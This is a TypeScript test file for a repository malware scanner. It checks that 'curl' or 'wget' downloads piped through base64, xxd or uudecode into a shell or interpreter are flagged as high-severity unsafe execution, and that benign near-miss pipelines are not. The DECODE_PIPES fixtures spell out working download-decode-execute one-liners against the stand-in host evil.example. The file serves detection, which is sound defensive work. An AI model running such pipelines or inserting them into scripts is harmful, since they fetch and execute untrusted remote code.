import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. A download piped through a decoder into a shell or
 * interpreter runs the downloaded bytes, decoded; the decode spellings
 * a plainly written decode flag does not cover are tested here.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const DECODE_PIPES: Record<string, string> = {
  "base64 -di into sh": "curl -s https://evil.example/x.b64 | base64 -di | sh",
  "base64 -id into sh": "curl -s https://evil.example/x.b64 | base64 -id | sh",
  "base64 -id into python3":
    "wget -qO- https://evil.example/x.b64 | base64 -id | python3",
  "base64 -di into sudo bash":
    "curl -s https://evil.example/x.b64 | base64 -di | sudo bash",
  "xxd -r -p into sh": "curl -s https://evil.example/x.hex | xxd -r -p | sh",
  "xxd -p -r into bash":
    "curl -s https://evil.example/x.hex | xxd -p -r | bash",
  "xxd -r into node": "curl -s https://evil.example/x.hex | xxd -r | node",
  "uudecode to stdout into sh":
    "curl -s https://evil.example/x.uu | uudecode -o /dev/stdout | sh",
};

test("a download piped through a decoder into an executor is unsafe execution", () => {
  for (const [name, body] of Object.entries(DECODE_PIPES)) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("decoders that do not hand the download to an executor keep no finding", () => {
  for (const body of [
    // The decoder writes a file; nothing runs it here.
    "curl -s https://example.com/data.b64 | base64 -di > decoded.bin",
    "curl -s https://example.com/data.hex | xxd -r -p > decoded.bin",
    // An xxd without -r encodes; the shell would read hex text.
    "curl -s https://example.com/data.bin | xxd | sh",
    // A uudecode without -o writes its embedded filename, not stdout.
    "curl -s https://example.com/x.uu | uudecode | sh",
    // Local input operands do not execute the remote stream.
    "curl -s https://example.com/data.hex | xxd -r -p local.hex | sh",
    "curl -s https://example.com/data.b64 | base64 -di local.b64 | sh",
    "curl -s https://example.com/data.uu | uudecode -o /dev/stdout local.uu | sh",
    // Unsupported flags or version/syntax-only targets do not run the stream.
    "curl -s https://example.com/data.b64 | base64 -qdi | sh",
    "curl -s https://example.com/data.hex | xxd -r -p | python3 -V",
    "curl -s https://example.com/data.hex | xxd -r -p | sh -n",
    // The decoder feeds a checksum, not an executor.
    "curl -s https://example.com/data.b64 | base64 -di | sha256sum",
    // No download: a local file decoded into a shell.
    "cat payload.hex | xxd -r -p | sh",
  ]) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ body, findings: categories(inspection) }).toEqual({
      body,
      findings: [],
    });
  }
});
